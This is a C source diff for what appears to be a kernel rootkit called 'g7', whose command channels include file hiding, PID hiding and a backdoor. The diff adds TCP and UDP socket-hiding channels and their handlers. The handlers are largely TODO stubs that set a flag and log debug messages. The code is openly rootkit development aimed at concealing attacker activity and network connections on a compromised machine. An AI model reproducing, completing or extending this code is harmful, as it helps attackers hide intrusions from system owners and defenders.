@@ -30,6 +30,8 @@ report_channels(void)
     DEBUG_NOTICE("%-24s %#10lx\n", "FILEHIDE", G7_FILEHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "OPENHIDE", G7_OPENHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "HIDEPID",  G7_PIDHIDE);
+    DEBUG_NOTICE("%-24s %#10lx\n", "TCPHIDE",  G7_TCPHIDE);
+    DEBUG_NOTICE("%-24s %#10lx\n", "UDPHIDE",  G7_UDPHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "BACKDOOR", G7_BACKDOOR);
     DEBUG_NOTICE("%-24s %#10lx\n", "TOGGLEBD", G7_TOGGLEBD);
     DEBUG_NOTICE("%-24s %#10lx\n", "LOGGING",  G7_LOGGING);
@@ -45,6 +47,8 @@ detect_channel(unsigned cmd)
     case G7_FILEHIDE: return (channel_t){ "FILEHIDE", handle_filehide };
     case G7_OPENHIDE: return (channel_t){ "OPENHIDE", handle_openhide };
     case G7_PIDHIDE:  return (channel_t){ "HIDEPID",  handle_pidhide  };
+    case G7_TCPHIDE:  return (channel_t){ "TCPHIDE",  handle_tcphide  };
+    case G7_UDPHIDE:  return (channel_t){ "UDPHIDE",  handle_udphide  };
     case G7_BACKDOOR: return (channel_t){ "BACKDOOR", handle_backdoor };
     case G7_TOGGLEBD: return (channel_t){ "TOGGLEBD", handle_togglebd };
     case G7_LOGGING:  return (channel_t){ "LOGGING",  handle_logging  };
@@ -170,6 +174,58 @@ handle_pidhide(unsigned long arg)
         hide_pid((pid_t)sarg);
         rootkit.hiding_pids = 1;
         DEBUG_NOTICE("[g7] hiding pid %ld\n", sarg);
+    }
+
+    return 0;
+}
+
+int
+handle_tcphide(unsigned long arg)
+{
+    long sarg = (long)arg;
+
+    if (!sarg) {
+        // TODO toggle hiding off, perhaps also remove all sockets (tcp & udp) that are currently being hidden
+        rootkit.hiding_sockets = 0;
+        DEBUG_NOTICE("[g7] socket hiding off\n");
+    } else if (sarg < 0) {
+        // TODO unhide tcp socket for port `-sarg`
+        DEBUG_NOTICE("[g7] unhiding tcp socket with port %ld\n", -sarg);
+    } else if (sarg > 0) {
+        if (!rootkit.hiding_sockets) {
+            // TODO toggle hiding back on
+            DEBUG_NOTICE("[g7] socket hiding on\n");
+        }
+
+        // TODO hide tcp socket for port `sarg`
+        rootkit.hiding_sockets = 1;
+        DEBUG_NOTICE("[g7] hiding tcp socket with port %ld\n", sarg);
+    }
+
+    return 0;
+}
+
+int
+handle_udphide(unsigned long arg)
+{
+    long sarg = (long)arg;
+
+    if (!sarg) {
+        // TODO toggle hiding off, perhaps also remove all sockets (tcp & udp) that are currently being hidden
+        rootkit.hiding_sockets = 0;
+        DEBUG_NOTICE("[g7] socket hiding off\n");
+    } else if (sarg < 0) {
+        // TODO unhide udp socket for port `-sarg`
+        DEBUG_NOTICE("[g7] unhiding udp socket with port %ld\n", -sarg);
+    } else if (sarg > 0) {
+        if (!rootkit.hiding_sockets) {
+            // TODO toggle hiding back on
+            DEBUG_NOTICE("[g7] socket hiding on\n");
+        }
+
+        // TODO hide udp socket for port `sarg`
+        rootkit.hiding_sockets = 1;
+        DEBUG_NOTICE("[g7] hiding udp socket with port %ld\n", sarg);
     }
 
     return 0;
